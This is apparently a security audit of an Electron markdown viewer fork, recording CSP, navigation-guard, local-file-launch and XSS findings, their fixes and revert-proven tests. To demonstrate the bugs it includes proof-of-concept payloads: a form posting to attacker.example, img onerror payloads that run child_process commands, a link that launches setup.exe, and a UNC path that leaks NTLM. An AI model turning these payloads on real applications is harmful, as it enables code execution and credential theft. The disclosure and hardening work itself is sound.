**Why it matters.** A CSP of `script-src 'self'` would have blocked SEC-05, SEC-06 and the `<script>` half of SEC-01 outright, and `default-src 'self'` would block the exfiltration/beaconing in SEC-15. Its absence means an injected payload can also freely `fetch()` attacker infrastructure to stage a second-stage payload or exfiltrate `fs.readFileSync` output.

Electron logs an explicit "Insecure Content-Security-Policy" warning for exactly this configuration.

**Fix.** Add a restrictive CSP. Note this requires resolving SEC-10 first (the current CDN `<script>` tags would be blocked by `script-src 'self'` — which is the point).

### FIXED — popups first, then the main window

The popup documents were done earlier (nonce CSP, see SEC-05/06/07/15). The main
window is now covered too, `index.html:6-40`.

Every directive was **measured**, not reasoned about, with a throwaway probe that
injected a candidate policy at runtime and reported what stopped working:

| Directive | Measurement |
|---|---|
| `script-src 'self' 'unsafe-inline'` | With plain `'self'` the `@@@html` srcdoc frame's script stopped running — **and so did the app's own height-reporting script**, which lives in the same srcdoc (`buildRawHtmlDocument()`, `renderer.js:260`). `'unsafe-inline'` is a deliberate, recorded concession. |
| no `'unsafe-eval'` | Measured: mermaid 11 and Prism render without it. |
| `style-src 'self' 'unsafe-inline'` | Inline `style` attributes are an allowed sanitizer output (SEC-21) and the theme system writes inline styles. |
| `img-src 'self' file: data: blob: https:` | `https:` kept **deliberately** — remote images in markdown are a real feature. Cleartext `http:` excluded. The read-receipt exposure is recorded here rather than traded away. |
| `connect-src 'none'` | Originally `'self' https://translate.googleapis.com`, because the translate feature was the only outbound call the app made. That feature was first moved into the main process and has since been **removed entirely** (below), so no process in this app now makes an outbound request carrying document content, and the renderer has **no** network destination of any kind. |
| `default-src 'none'` + no `frame-src` | `frame-src` falls back to `'none'`, which still permits `about:srcdoc` frames (measured) while blocking every remote and local-file frame. |
| `object-src 'none'`, `base-uri 'none'`, `form-action 'none'` | Complements the `FORBID_TAGS: ['form']` and navigation guards of SEC-11. |

**Honest limitation.** CSP inheritance is the whole story here: an `about:srcdoc`
frame runs under its embedder's policy, so `@@@html` cannot be given a stricter
one than the window it sits in (blob: and data: inherit too; only a real custom
protocol would escape). `'unsafe-inline'` therefore stays. The value this policy
delivers is constraining what the window may **load and reach** — not defending
against inline injection, which is moot anyway while `nodeIntegration: true`
(SEC-08). Tightening `script-src` requires moving `@@@html` onto a custom
protocol; that is a real option, and it is not done.

**Two findings that came out of doing this, neither in the original audit:**

1. **`frame-ancestors` is silently ignored in a `<meta>` policy**, and Chromium
   logs an error for it on every load. It was present in the first draft of
   `index.html` *and* had already shipped in `popupCsp()` (`main.js`), so every
   popup open logged an error nobody was reading. Removed from both — it was
   meaningless anyway for top-level Electron windows that nothing can embed.
   (Same class: `sandbox` and `report-uri` are also meta-ignored.)
2. **The new CSP shadowed an existing SEC-11 test.** The `@@@html`
   subframe-navigation test began failing with `ERR_BLOCKED_BY_CSP`: with no
   `frame-src`, Chromium refuses the navigation *before* `will-frame-navigate`
   fires — and a CSP-blocked navigation still **commits an error document**, so
   `frame.url` becomes the target either way, destroying the test's
   discriminator. It could not be repaired by changing the target, because the
   policy permits no frame destination at all. Rewritten: the end-to-end check
   asserts the invariant, and the guard itself is driven directly with
   `webContents.emit("will-frame-navigate", …)` and a synthetic event — which
   additionally covers the `isMainFrame` early-return branch that no end-to-end
   test can reach.

**Collateral cleanup.** `index.html`'s two remaining inline `onclick` attributes
(the file-update toast's Reload and Dismiss) are gone; Dismiss is now bound in
`custom-tabs.js`'s `bindUpdatePrompt()`.

**Tests.** 9 assertions in `test-render-security.js`, which bypass DOMPurify on
purpose (building nodes with `document.createElement`) so the layer under test is
the *policy*, not the sanitizer. Revert-proven: disabling the meta fails 7 of 9
(the 2 controls correctly stay green); deleting the `will-frame-navigate`
listener fails the "armed and denies" assertion; deleting the `isMainFrame`
early return fails the "defers to will-navigate" assertion.

### Follow-up — `connect-src` reduced to `'none'` *(raised in review; the two reviewers disagreed)*

One reviewer would not accept SEC-09 as "fixed" while `connect-src` still named
a remote host, `img-src` still allowed `https:` and `'unsafe-inline'` was still
present — its argument being that a working exfiltration path remains in a
`nodeIntegration` renderer. The other reviewed the same directives, verified the
`worker-src` / `manifest-src` / `child-src` fallbacks, and raised no blocking
objection. **Both were partly right, and the disagreement is recorded rather
than quietly resolved in favour of one of them:**

- The suggested change was worth making and has been made. `googleTranslate()`
  was the renderer's *only* network call, so moving it into the main process
  behind `ipcMain.handle("translate-text")` cost one IPC hop and let the
  renderer's policy become `connect-src 'none'` — no fetch, XHR, WebSocket,
  EventSource or `sendBeacon` destination at all.
- But its stated *benefit* does not hold yet, and saying so matters more than
  the change itself: the main window still runs with `nodeIntegration: true`
  (SEC-08), so script executing there can `require('https')` and ignore CSP
  entirely. **In that renderer, CSP is defence-in-depth, not containment.** The
  reviewer's conclusion — "therefore SEC-09 is not fixed" — would be right if
  CSP were being sold as containment. It is not; the limitation is stated
  above. The real remaining work is SEC-08.
- `img-src https:` is unchanged and is a **deliberate** trade (remote images in
  markdown are a real feature). It leaves a GET-shaped, URL-length-limited
  egress path. That is recorded here, not traded away.

The language tag is validated against a shape (`/^[a-z]{2,3}(-[A-Za-z]{2,4})?$/`)
before it is interpolated into the URL, and the payload is length-capped —
otherwise moving the request to the main process would just relocate the
injection surface to a more privileged place.

**Tests.** Two assertions replace the old "the translation endpoint is *not*
refused" control, which had become exactly backwards:

1. The renderer must now be refused even for `translate.googleapis.com`.
   Revert-proven (R38): restoring the old `connect-src` fails it.
2. Translation must still *work* — otherwise assertion 1 could be satisfied by
   deleting the feature, which is not the same fix. Revert-proven (R39):
   removing the IPC handler fails it with `No handler registered`.

*(R38 and R39 were retired with the feature and are no longer in
`scripts/prove-table-fixes.js`. The live revert for this area is **R168**,
described below; the IDs above are left as written because this section is a
record of what was decided at the time.)*

Assertion 2 is hermetic (it exercises language validation and handler presence,
not the network). The part that cannot be tested hermetically has its own
opt-in, network-dependent test — `npm run test:translate` — kept out of
`npm test` on purpose, because a suite that fails when someone is offline
teaches people to ignore failures. Verified end to end besides: `hello world` →
`Selam Dünya` in the real UI, screenshot inspected.

### Superseded — the feature was removed outright

Everything above is now history and is kept only because the reasoning is worth
reading. Document translation has been **deleted** from this fork (see
`8c1-translation`), so assertion 2 above — "translation must still work" — was
exactly the assertion that had to be inverted.

What changed, and why the inversion is not a weakening:

- The renderer CSP assertion stands unchanged. `connect-src 'none'` still
  refuses `translate.googleapis.com`.
- Its companion now asserts the opposite of what it used to: the
  `translate-text` IPC route must answer `No handler registered`, **and**
  `main.js` must contain no live reference to the endpoint. That second oracle
  is deliberately a source check for a URL inside a string or template rather
  than a search for the word "translation" — the comment that records this
  removal names the endpoint in prose, and an oracle its own documentation can
  break is not an oracle.
- The IPC route mattered more than the CSP here, and that is the point of
  keeping both. `connect-src` binds the renderer; it says nothing about the
  main process, which has no CSP at all. While the handler existed, any script
  in this `nodeIntegration` renderer could invoke it and post document text out
  through a more privileged process — the CSP's own stated limitation, in
  practice. Removing the route closes **that one route**, and nothing more:
  script in this renderer can still `require('https')` directly and needs no
  IPC hop at all. SEC-08 is what closes the class; this closes the instance the
  product itself shipped and pointed at a third party.
- The oracles are correspondingly narrow, and should not be read as proof that
  "nothing in this app reaches the network". They catch this exact route
  returning, by this exact name, to this exact host. A renamed handler, a
  different endpoint, or a URL assembled from fragments would pass both. That
  is the honest scope: a regression guard on a removal, not a network policy.
  The general control would be a main-process request filter
  (`session.webRequest.onBeforeRequest`), which is separate hardening and is
  **not** part of this change.
- `npm run test:translate` and `test-translate-network.js` are deleted with it.

The `img-src https:` trade recorded above is **unchanged**: remote images in
markdown are still a feature, and that GET-shaped path still exists. Only the
POST-shaped, document-content-carrying one is gone.

---

## SEC-27 — OmniWare's hand-drawn fonts were silently blocked by the popup CSP *(found by the error sentinel, not in the original audit)*

**Severity: Low** (privacy + a visibly broken feature) · Confidence 10/10 · Upstream

**Location:** `omniwire/omniware.js` (the `STYLES` template), `omniwire/omniware_preview.html`

OmniWare's stylesheet pulled its two fonts with
`@import url('https://fonts.googleapis.com/…')`. The popup CSP (SEC-06) allows no
remote stylesheet, so the import was **refused on every wireframe** and the whole
surface fell back to generic `cursive`. The only symptom was a console message,
and nothing was reading the popup consoles — this is precisely the class of
defect the error sentinel below was built to catch, and it was its first find.

Two problems in one: a **broken feature** (the hand-drawn look is the entire
point of OmniWare) and, had the CSP allowed it, a **third-party request on every
diagram open**.

**Fix.** Vendor the fonts rather than relax the CSP — consistent with SEC-16's
un-CDN'ing. `@fontsource/architects-daughter` and `@fontsource/patrick-hand` are
copied into `fonts/` by `scripts/vendor-libs.js`; `omniwareFontFaceCss()` in
`main.js` emits `@font-face` rules into the popup `<head>`. The URLs must be
**absolute** — these popups are written to `%TEMP%`, so a relative URL resolves
against the temp directory — and are built with `url.pathToFileURL()` rather than
string concatenation, which breaks on install paths containing a space or `#`.
`popupCsp()`'s existing `font-src file: data:` already permits them.

**Former gap, now closed by removal:** the VS Code extension carried its own
copies (`vscode-extension/media/omniwire/*`) that still used the remote `@import`.
That sub-project has since been dropped from the fork entirely, so the surface no
longer exists.

**Test.** One assertion in `test-popup-security.js` — and the *first version of it
was vacuous*, which is recorded because it is an easy trap:
`document.fonts.check('16px "Patrick Hand"')` returns **true for a family nobody
defined**, because the spec asks "can this font spec be rendered" and fallback
always can. Reverting the fix did not fail it. It now asserts (a) a `FontFace`
for the family is registered with `status === 'loaded'`, and (b) canvas
`measureText` of the same string differs from a deliberately-absent family — the
only evidence the vendored woff2 is what is actually being drawn with. Both
reverts now fail as they should, and the rendered wireframe was checked by eye in
`screenshots/omniware-fonts.png`.

---

## Continuous error sentinel *(test infrastructure, added while fixing SEC-09)*

Prompted by the user reporting they could *see* syntax errors on screen during
test runs while every suite reported 0 failures. The suites were blind to two
whole classes of problem: **console errors** (parse failures, CSP refusals,
rejected promises) and **errors that only exist as pixels** — mermaid draws its
"Syntax error in text" bomb graphic and reports nothing, and a broken `<img>` is
silent by design.

`startErrorSentinel(win, opts)` in `test-visual-utils.js` watches both angles
continuously for the whole run: a main-process `console-message` listener plus a
300 ms in-page DOM poll, capturing a screenshot at the first sighting of each
distinct problem. It is attached in all six Electron suites, one per window — 32
of them in the popup suite, since each popup is a separate window with its own
console.

Deliberately-failing scenarios use narrow `mute()`/`unmute()` windows, and the
mute *extent* is itself asserted (mermaid: "muted exactly once, and the mute
really caught the failure it was opened for"; popups: "the injection probe was
actually refused") — otherwise a scenario that stopped failing would go vacuous
in silence.

**It found three real defects on its first runs:** the two `frame-ancestors`
console errors above, the OmniWare font regression (SEC-27), and a broken
`<img src="x.png">` in a `test-render-patch.js` fixture — which was fixed by
pointing the fixture at a real image, i.e. by removing the broken image from the
app under test rather than teaching the harness to tolerate it.

### What a dual-model review of the sentinel then found

The sentinel was reviewed independently by two models. Everything below was
verified by reverting the fix and watching the assertion fail, not by reading
code.

| Defect | Why it mattered |
|---|---|
| `record()` early-returned once `stop()` had been called, and `stop()` never awaited work already in flight | A real error observed in the very last poll was either dropped or landed in `hits` *after* the report had been read. The hit is now pushed **before** any `await`; only the screenshot, which needs a live window, is skipped while stopping. |
| `setInterval` with an async callback | It re-fires whether or not the previous scan finished, so scans overlapped and interleaved their `record()` calls. Replaced with a chained `setTimeout`. |
| Muting was racy | `console-message` crosses an IPC boundary, so it does **not** arrive merely because an awaited `executeJavaScript` resolved. A violation could land just after `unmute()` and fail the run non-deterministically. `mute()`, `unmute()` and `stop()` now `await drain()` — a renderer round-trip, a settle, a scan, and the pending records. |
| `seen` was cleared only on `unmute()` | A message already recorded unmuted was silently skipped *inside* a later mute, making "the probe really fired" assertions vacuous. Now cleared on both edges. |
| Nothing proved the watcher was alive | `hits.length === 0` and "the watcher silently stopped working" were the same result — the exact vacuity the harness exists to remove. `proveSentinelAlive()` now provokes a marked `console.error` **and** an on-screen error node inside a mute, and asserts **both channels** reported. They fail independently: breaking the console path reported `{console:false, dom:true}` and breaking the DOM poll reported `{console:true, dom:false}`. |
| An unbounded `executeJavaScript` could hang the harness | Electron leaves the promise **pending forever** when a window is destroyed mid-call — it does not reject. The popup suite hung at teardown and surfaced only as an opaque 240 s suite timeout naming neither the phase nor the window. Every sentinel round-trip is now bounded and a stall is *reported* (`report.stalls`, asserted empty) rather than waited on. A window destroyed mid-flight is ordinary teardown and deliberately not counted as a stall. |

### Two assertions that were passing while proving nothing

Both were found by **reverting the fix** and seeing the test still pass. Neither
was visible by reading the test.

1. **`document.fonts.check('16px "Patrick Hand"')` returns `true` for a family
   nobody ever defined.** The spec asks "can this font spec be rendered", and
   fallback always can. Removing the entire `@font-face` injection did not fail
   the test. It now requires a registered `FontFace` with `status === 'loaded'`
   **and** a canvas `measureText` width that differs from a deliberately-absent
   family.
2. **Counting `<script nonce>` tags does not prove the script ran.** A
   completely broken popup refuses injected script just as convincingly as a
   working one, so every CSP probe stayed green either way. Replaced with a
   per-popup-kind side effect that only exists once the real script executed
   (`window.resetView`, `#render-target` children, `#data-table` rows). Proven:
   with a deliberately mismatched nonce, all four fail and the sentinel catches
   16 console errors — the old assertion passed.

### A test that was failing for a reason that was not the app's fault

`SEC-09 plugin content is refused by object-src 'none'` failed intermittently,
and only when the security suite ran after another suite. It was not a timing
race — polling for eight seconds still saw nothing. **Chromium only fetches
`<object data>` once the element has been laid out, and it throttles rendering
for an occluded or background window**, which is exactly what this window is
during an unattended full-suite run. Never laid out, never fetched, never
refused — against a policy that was working perfectly. The probe now forces
layout synchronously, and the assertion reports the element's own geometry
alongside the violation list so the two failure modes can never be confused
again.

---

## SEC-10 — Core libraries loaded from a public CDN with no Subresource Integrity, into the Node-privileged renderer

**Severity: High** · Category: SupplyChainAttack / AuthenticationFailure · Confidence 9/10 · Upstream

**Location:** `index.html:26-28`, plus `index.html:13-24` (Google Fonts)

```html
<script src="https://cdn.jsdelivr.net/npm/marked@9.1.6/marked.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
```

**Why it is exploitable.** Three third-party scripts execute with `require()` in scope, over the network, with:
* **no `integrity=` / SRI hash** — a jsDelivr compromise, a hostile CDN edge, a corporate TLS-intercepting proxy, or DNS/BGP hijack yields silent RCE on every user of the app;
* **no CSP to constrain them** (SEC-09);
* **one of them is the security control itself** — DOMPurify. An attacker who can influence the CDN response for `purify.min.js` disables the sanitizer for the entire application.

The versions requested from the CDN are also **older than what is installed locally** and carry known advisories (SEC-16). Note the irony: `package.json:44-52` already declares `marked`, `mermaid` and `dompurify` as dependencies and `npm ls` confirms they are installed under `node_modules/`, and `package.json` `build.files` ships `node_modules/**/*` into the package — yet `index.html` loads the CDN copies instead. PrismJS is already correctly loaded from disk (`index.html:30` → `libs/prismjs/prism-bundle.js`), so the local-loading pattern is established in the codebase.

There is also a functional-availability consequence worth noting: with no network, `DOMPurify`, `marked` and `mermaid` are all `undefined` and rendering throws.

**Fix.** Load all three from `node_modules/` or `libs/` like Prism already is. Remove the Google Fonts `<link>`s (`index.html:13-24`) or bundle the font — the fork **now ships** FiraCode TTFs (`assets/fonts/` → `fonts/` via `scripts/vendor-libs.js`, which is on `postinstall`). At audit time they existed only inside the `vscode-extension/` source subtree and did not ship at all; that subtree has since been deleted, the five referenced weights were relocated to the tracked `assets/fonts/`, and the unreferenced `FiraCode-Retina.ttf` was dropped rather than moved.

---

## SEC-11 — No navigation guards: `will-navigate` / `setWindowOpenHandler` are absent, and `<form action>` survives sanitization

**Severity: High** · Category: SecurityMisconfiguration · Confidence 8/10 · Upstream

**Location:** `main.js` — no `will-navigate`, `new-window` or `setWindowOpenHandler` handler exists on any `webContents` (grepped, zero matches). Sanitizer config at `renderer.js:3155-3158`.

**Why it is exploitable.** Nothing prevents the top-level frame of the `nodeIntegration: true` main window from navigating to a remote URL. If that happens, the attacker's page *is* the Node-privileged renderer.

I verified against the bundled DOMPurify allowlist (`node_modules/dompurify/dist/purify.js:305` and `:319`) that **`form` is an allowed tag and `action` is an allowed attribute**. So this markdown survives sanitization intact:

```html
<form action="https://attacker.example/pwn.html" method="GET">
  <button>Click to view the full diagram</button>
</form>
```

One click navigates the main window to attacker-controlled HTML, which then runs with `require`. The click handler at `renderer.js:1320-1418` only intercepts `<a>` elements (`e.target.closest('a')`) — form submission is not intercepted.

This is also the escalation path that makes SEC-01 unconditionally Critical.

**Fix.** Add on every window:
```js
win.webContents.on('will-navigate', (e, url) => {
  if (url !== win.webContents.getURL()) e.preventDefault();
});
win.webContents.setWindowOpenHandler(() => ({ action: 'deny' }));
```
and add `'form'`, `'action'`, `'formaction'` to DOMPurify's `FORBID_TAGS`/`FORBID_ATTR`.

### Status: FIXED (main window) — `main.js:356-386`, `renderer.js:122-152`, `renderer.js:194-207`, `renderer.js:1886`

Two independent layers, because neither is sufficient alone. The sanitizer
cannot see a navigation the DOM never expressed (`window.open`, a meta refresh,
a frame relocating itself); the navigation guard cannot distinguish a wanted
navigation from an unwanted one if the app ever grows a legitimate one.

**Layer 1 — sanitizer (`renderer.js`).**

* `FORBID_TAGS: ['form']`. This is the load-bearing line. Measured: with it
  removed, `<form action="https://…"><button>x</button></form>` comes out of the
  pipeline intact (`{"forms":1,"actionAttrs":1}`).
* `FORBID_ATTR: ['action', 'formaction']` is **forward-defence, not a live
  control**, and the honest accounting matters: `action` only exists on `<form>`
  and goes with the tag; `formaction` is already stripped from `<button>` and
  `<input>` by DOMPurify unaided. Both independently confirmed by the two
  reviewers. The lines are kept so that a future edit adding `'form'` to
  `ADD_TAGS` cannot quietly reopen this.
* `<iframe src>` is removed in the `afterSanitizeAttributes` hook. **This was not
  in the original finding and was found while fixing it:** `iframe` is in
  `ADD_TAGS` (for `@@@html`) and `src` is a DOMPurify default-allowed attribute,
  so `<iframe src="https://attacker/">` in ordinary markdown fetched and ran a
  remote page inside the main window *with no click at all* — a silent
  IP/User-Agent beacon on every document open, at minimum. The app's own iframes
  are `srcdoc`-only, so `src` never comes from us.
* `<map><area href>` survives sanitization and is a hyperlink that is not an
  `<a>`. The renderer's click handler now matches `'a, area'`, so an image map
  obeys the same external-link and SEC-12 local-file policy as everything else
  instead of falling through to Chromium's default follow.

**Layer 2 — main process (`main.js`).** `will-navigate`, `will-redirect`,
`will-frame-navigate` (subframes only) and `setWindowOpenHandler`, attached
*before* `loadFile` to match `registerPopup()`. `loadFile` does not fire
`will-navigate`, so nothing legitimate is affected: the app never navigates the
top frame, `@@@html` frames load from `srcdoc` (which does not fire
`will-frame-navigate`), `#hash` links are `preventDefault`ed by the renderer,
and `history.pushState`/`replaceState` are same-document.

**Deliberate collateral:** a subframe can no longer navigate itself at all, so a
remote `<iframe src>` would be blocked even if it survived the sanitizer.

**Revert-proof.** Each control was removed in turn and the suite re-run:

| Removed | Observed |
|---|---|
| `FORBID_TAGS: ['form']` | `<form>` and its `action` survive: `{"forms":1,"actionAttrs":1}` |
| `will-navigate` guard | window commits the probe document; `getURL()` changes to it |
| `removeAttribute('src')` on iframes | `src="https://probe.invalid/frame"` present in the DOM |
| `closest('a, area')` → `closest('a')` | `<area>` click reaches neither `openExternal` nor the local-file policy |
| `will-frame-navigate` guard | the `@@@html` frame relocates: `subframeUrls === ["https://probe.invalid/frame-probe"]` |

**Two test-design traps found while writing those proofs**, both of which
produced a green but meaningless assertion:

1. `webContents.getURL()` reports only the **top** frame. A sandboxed frame
   navigating *itself* leaves it untouched, so the first version of the subframe
   test passed with the guard deleted. It now reads
   `webContents.mainFrame.frames` directly.
2. The subframe probe target must be **remote**. Chromium refuses to let a
   sandboxed, origin-opaque frame reach a `file:` URL on its own, so a local
   target also passed with the guard deleted.

**Coverage:** 7 assertions in `test-render-security.js`, each with a control
assertion proving the payload reached the sanitizer/handler rather than the
render having silently failed.

---

## SEC-12 — One-click execution of an arbitrary local file via a markdown link (`shell.openPath`)

**Severity: High** · Category: BrokenAccessControl · Confidence 9/10 · Upstream

**Location:** `renderer.js:1384-1418`

```js
// renderer.js:1408-1415
if (fs.existsSync(targetPath)) {
  const ext = path.extname(targetPath).toLowerCase();
  if (['.md', '.markdown', '.mmd', '.mermaid', '.ow'].includes(ext)) {
    ipcRenderer.send('open-file-path', targetPath);
  } else {
    shell.openPath(targetPath);      // <-- any other extension, no allowlist, no prompt
  }
}
```

**Why it is exploitable.** The threat model explicitly includes *"cloned from untrusted repos"* and *"downloaded from the internet"* — i.e. the markdown arrives **alongside sibling files the attacker also controls**. `targetPath` is resolved relative to the markdown's own directory (`renderer.js:1401-1404`), and there is no extension allowlist, no path containment check, and **no confirmation dialog**.

Attack: a repo/zip containing `README.md` and `setup.exe`, where `README.md` says:

```markdown
See the [architecture diagram](./setup.exe) for details.
```

One click on a link that looks like documentation → `shell.openPath` hands the file to the Windows shell → the executable runs. `.bat`, `.cmd`, `.hta`, `.scr`, `.lnk`, `.msi`, `.ps1` all work identically. On Linux/macOS the equivalent is a `.desktop` file or a shell script with the execute bit set.

Related, same code path: `path.isAbsolute()` treats `\\attacker.example\share\x.md` as absolute on Windows, so `fs.existsSync(targetPath)` at `renderer.js:1408` triggers an outbound SMB connection and an NTLMv2 challenge/response leak. DOMPurify permits such an href — its `IS_ALLOWED_URI` regex (`node_modules/dompurify/dist/purify.js:~330`) accepts any scheme-less value starting with a non-`[a-z]` character, including `\`.

**Fix.** Allowlist safe extensions for `shell.openPath` (documents, images), refuse executables outright, and show an explicit confirmation dialog naming the file for anything else. Reject UNC paths and paths that escape the document's directory.

**FIXED.** `renderer.js` now decides what a local-file link may do from the file that will
**actually** open, not from the href:

1. **UNC / protocol-relative** (`^(\\\\|//)`) — rejected *before* `fs.existsSync()`. The
   ordering is the whole point: `existsSync()` on a UNC path is itself the SMB connection,
   so a check placed after it leaks the NTLMv2 handshake even when nothing is opened. The
   same check is repeated on the resolved path, because a symlink can point at a share
   even when the href did not.
2. **`resolveLinkTarget()`** collapses symlinks, junctions and `..` via
   `fs.realpathSync.native()`, and the extension test runs on the result. Without this the
   whole policy is decorative: a symlink named `diagram.png` pointing at `payload.ps1`
   opens as the script. Symlinks are ordinary on the macOS and Linux release targets. (A
   Windows `.lnk` is *not* a filesystem link and realpath leaves it alone — which is why
   `.lnk` is itself in `EXECUTABLE_EXTS`.)
3. **`EXECUTABLE_EXTS`** — refused outright with a notification, no prompt. Beyond the
   obvious binaries and interpreters this includes the macro-enabled Office formats and
   the class of formats whose *handler* is the exploit: `.iso`/`.img`/`.vhd`/`.vhdx`
   (the shell mounts them on open), `.chm`, `.jnlp`, `.diagcab`, `.settingcontent-ms`,
   `.library-ms`, `.search-ms`, `.scf`, `.theme`, `.terminal`, `.workflow`. This arm is
   deliberately ahead of the directory arm, because a macOS `.app` bundle *is* a directory
   and opening it launches it.
4. **Directories** — opened directly. A folder link is ordinary and nothing is executed.
5. **Extensionless files** — a `confirm()`, not a refusal, except on Unix where the
   execute bit is set (then refused). `README`, `LICENSE`, `Makefile` and `.bashrc` all
   have `path.extname() === ''`; an earlier revision of this fix refused every one of them
   and told the user they were executables. On Windows the shell cannot run an
   extensionless file at all.
6. **`SAFE_OPEN_EXTS`** — inert documents, images and media open directly.

Anything **unrecognised** falls through to a `confirm()` naming the file. That default is
deliberate: a denylist that fails open ages badly. `.svg` (script-capable when the system
handler is a browser), **`.pdf`** (attacker-controlled bytes into a large parser with an
embedded scripting engine) and **`.rtf`** (a repeat in-the-wild RCE vector whose default
Windows handler is now Word) are all in this bucket rather than the safe one.

**Not fixed:** path containment. A link may still point outside the document's directory
(`../../elsewhere/notes.txt`). Containment was considered and rejected as the wrong
control here — cross-directory links are ordinary and legitimate in real documentation
trees, and the extension policy is what actually blocks the dangerous outcome regardless
of where the file lives. `realpathSync` also means a symlink cannot be used to disguise
where the target really is.

**Coverage:** 13 assertions in `test-render-security.js`, all driving the real
anchor-click handler against real files on disk. Proven non-vacuous by individual reverts:

| Reverted | Observed failure |
|---|---|
| extension policy | `./setup.exe` handed straight to `shell.openPath`, no prompt |
| UNC guard | `fs.existsSync('\\\\attacker.invalid\\share\\payload.txt')` fires |
| `realpathSync` | `diagram-link.png` → `script.ps1` opened via `shell.openPath` |
| directory arm | a folder link is prompted for as an unknown file type |

---

## SEC-13 — Unescaped `data-note-id` in the notes tooltip and notes list

**Severity: High** · Category: StringInjection · Confidence 8/10 · Upstream

**Location:** `renderer.js:5588` (tooltip), `renderer.js:2457` (notes side panel)

```js
// renderer.js:5586-5589
if (title)   html += `<div class="note-tooltip-title">${title.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>`;
if (content) html += `<div class="note-tooltip-content">${content.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>`;
if (noteId)  html += `<div class="note-tooltip-id">#${noteId}</div>`;   // <-- NOT escaped
noteTooltip.innerHTML = html;
```

**Why it is exploitable.** `title` and `content` are carefully escaped on the two adjacent lines; `noteId` is not — an inconsistency that reads like an oversight rather than a deliberate trust decision. `noteId` is read from the `data-note-id` DOM attribute (`renderer.js:5580`, `renderer.js:2438`), and `data-note-id` is **explicitly whitelisted** in the DOMPurify config at `renderer.js:3157` (`ADD_ATTR: [..., 'data-note-id', ...]`), so its value passes through the sanitizer untouched with full attacker control.

Payload — fires when the user hovers the highlighted text (the app renders notes with a visible underline/highlight that invites hovering):

```markdown
<span class="noted-text" data-note-id="<img src=x onerror=require('child_process').exec('calc.exe')>" data-note-title="Note">hover me</span>
```

The same unescaped `#${noteId}` appears in the All Notes panel at `renderer.js:2457`, which renders automatically whenever the document contains any note (`renderer.js:2423`) — that variant needs no hover.

**Fix.** Escape `noteId` identically to `title`/`content`, or better, validate it as `/^\d+$/` (the codebase already assumes it is numeric — see `parseInt` at `renderer.js:2432` and the `\d+` regex at `renderer.js:4662`).

**FIXED.** Both templates were rebuilt out of DOM nodes with `textContent` rather than
patched with another escape call — escaping is a per-site decision that has to be got
right every time, and this finding exists precisely because two adjacent lines got it
right and the third did not.

Two further sinks in `updateNotesList()` that this audit **missed** were found while
making the change:

- `${color}` was interpolated into a `style="…"` **attribute**, which is a strictly worse
  position than element text — `"` closes the attribute and admits further markup. This
  was **exploitable**, and by a shorter route than the `#${noteId}` the audit did call
  out. `extractNoteColor()` returned `data-note-color` **verbatim** for `.noted-text`
  (only the `.note-label` and `.noted-image` branches were regex-constrained), and
  `data-note-color` is on the DOMPurify allowlist. It is now assigned as a CSSOM property,
  which cannot escape into markup at all, **and** normalized at source.
- `${type}` was interpolated raw. It is one of three hardcoded constants (`'Label'`,
  `'Image'`, `'Text'`) selected by which class the note carries, so it was never
  attacker-influenced.

**`normalizeNoteColor()`** was added because the property assignment alone only protects
*this* site. The same unvalidated value is round-tripped back into **raw markdown source**
by the note editor — `data-note-color="${color}"` and `text-decoration-color:${color}`
at `renderer.js:5793/5833/5859` — so a hostile value re-enters the document as markup on
save. Sanitize-last keeps that from reaching script execution, but it should never have
depended on that. Every read path (`extractNoteColor`, the editor's `noteSelectedColor`
and the post-render styling pass) now goes through it, and
anything that is not `#rgb`/`#rrggbb` collapses to the default.

**Attribute-selector injection** was found in the same area and fixed: four
`querySelector(\`[data-note-id="${id}"]\`)` sites built a selector out of the same
allowlisted attribute. A `"` in the value throws a `SyntaxError` from inside an event
listener — an attacker-triggerable crash of the notes UI. All four now use `CSS.escape`,
matching the pattern already used for the collapsible-section selector.

The tooltip's inline `onclick="closeNoteTooltip()"` was also converted to
`addEventListener` — it is not a vulnerability by itself, but it is exactly what blocks
extending the popup nonce-CSP (SEC-09) to the main window.

**Coverage:** 7 assertions in `test-render-security.js`, including a *control* assertion
that the payload really does survive DOMPurify into `data-note-*` — without it the rest
could pass simply because the attributes had been stripped. Proven non-vacuous: switching
the three `textContent` assignments back to `innerHTML` injects a live `<img>` into all
three surfaces; dropping `normalizeNoteColor` leaves the CSSOM setter as the only barrier;
dropping `CSS.escape` raises `Failed to execute 'querySelector' … is not a valid selector`.

---

## SEC-14 — Unescaped filename and path in the recent-files menu

**Severity: Medium** · Category: StringInjection · Confidence 8/10 · Upstream

**Location:** `renderer.js:2083-2087`

```js
item.innerHTML = `
  <span class="tools-menu-recent-name">${file.name}</span>
  <span class="tools-menu-recent-path">${file.path}</span>
`;
```

**Why it is exploitable.** Filesystem-derived strings go to `innerHTML` unescaped. On Linux and macOS (both are release targets — `package.json` `build.linux` / `build.mac`) `<`, `>`, `"` and `&` are all legal filename characters. A file named `<img src=x onerror=require('child_process').exec('id')>.md` inside an untrusted archive executes the moment the user opens the File menu after having opened it once. Because recent files are persisted, the payload re-arms on every launch until cleared.

Rated Medium rather than High because it is not reachable on Windows (`<>` are illegal in NTFS filenames) and requires the user to open the menu.

**Fix.** Use `textContent` on two child spans, as `custom-tabs.js:392-394` already does correctly for tab titles.

**FIXED** exactly as described — the item is now built with `createElement` and
`textContent` for both the name and the path. Covered by an assertion that a filename
containing `<img src=x onerror=…>` reaches the menu as text; reverting the assignment to
`innerHTML` injects a live element.

---

## SEC-15 — Table popup: `JSON.stringify` into a `<script>` block allows `</script>` breakout

**Severity: Medium** · Category: StringInjection · Confidence 8/10 · Upstream

**Location:** `main.js:2119-2122`

```html
<script>
    ${tabulatorJs}
    const tableData = ${JSON.stringify(tableData)};
```

**Why it is exploitable.** `JSON.stringify` does not escape `<` or `/`. `tableData` is built from markdown table cell `textContent` (`renderer.js:extractTableData`), so a table cell containing `</script><script>...</script>` closes the script element and injects arbitrary JS.

Impact is **contained** — and this is the one popup that is configured correctly: `main.js:1865-1868` sets `nodeIntegration: false, contextIsolation: true`. So this is arbitrary JS in a Node-free window, not RCE. It can still exfiltrate the table contents, render a convincing credential-phishing prompt in a window bearing the app's identity, and (with no CSP) beacon out.

